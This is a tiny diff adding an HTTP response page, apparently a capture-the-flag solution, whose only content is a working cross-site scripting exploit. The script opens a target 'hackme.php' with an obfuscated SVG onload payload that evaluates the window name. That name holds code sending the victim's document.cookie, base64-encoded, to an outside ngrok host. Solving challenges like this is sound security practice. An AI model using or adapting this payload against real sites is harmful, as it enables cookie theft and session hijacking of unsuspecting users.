@@ -1,0 +1,8 @@
+HTTP/1.1 200 OK
+
+<!DOCTYPE html>
+<html>
+<script>
+window.open('https://edu-ctf.kaibro.tw:30678/hackme.php?q=<SVG%2FoNLOAD%3Deval(n%26%2397m\\u{65})>','fetch("https://670f47c9.ngrok.io/"+btoa(document.cookie));')
+</script>
+</html>
